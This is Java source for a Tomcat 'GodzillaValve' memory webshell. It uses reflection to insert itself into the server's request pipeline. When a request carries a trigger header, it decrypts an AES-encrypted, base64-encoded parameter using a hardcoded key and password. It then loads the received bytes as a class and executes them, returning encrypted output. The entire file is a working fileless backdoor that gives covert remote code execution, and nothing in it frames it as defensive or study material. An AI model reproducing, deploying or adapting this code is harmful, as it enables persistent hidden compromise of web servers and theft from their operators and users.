package com.summersec.x;

import org.apache.catalina.Pipeline;
import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.security.MessageDigest;

public class GodzillaValve extends ClassLoader implements Valve {
    protected Valve next;
    protected boolean asyncSupported;
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    String xc = "3c6e0b8a9c15224a";
    public String Pwd = "pass1024";
    String md5;
    String randomHeader = "default";
    public String cs = "UTF-8";

    public GodzillaValve() {
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }

    public GodzillaValve(ClassLoader z) {
        super(z);
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.Pwd = this.request.getHeader("p");
        this.randomHeader = this.request.getHeader("h");
        this.md5 = md5(this.Pwd + this.xc);
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addValve());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public Class Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public String addValve() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Field contextField = servletContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext)contextField.get(servletContext);
        contextField = applicationContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        StandardContext standardContext = (StandardContext)contextField.get(applicationContext);
        Pipeline pipeline = standardContext.getPipeline();
        pipeline.addValve(this);
        return "Success";
    }

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public void backgroundProcess() {

    }

    @Override
    public void invoke(Request req, Response resp) throws IOException, ServletException {
        try {
            HttpServletRequest request = req;
            HttpServletResponse response = resp;
            // 入口
            if (request.getHeader(randomHeader).equals(randomHeader)) {
                HttpSession session = request.getSession();
                byte[] data = base64Decode(request.getParameter(Pwd));
                data = this.x(data, false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", (new GodzillaValve(this.getClass().getClassLoader())).Q(data));
                } else {
                    request.setAttribute("parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class) session.getAttribute("payload")).newInstance();
                    f.equals(arrOut);
                    f.equals(data);
                    f.equals(request);
                    response.getWriter().write(md5.substring(0, 16));
                    f.toString();
                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    response.getWriter().write(md5.substring(16));
                    response.flushBuffer();
                }
                return;
            }
        } catch (Exception e) {
        }

        this.getNext().invoke(req, resp);
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
}
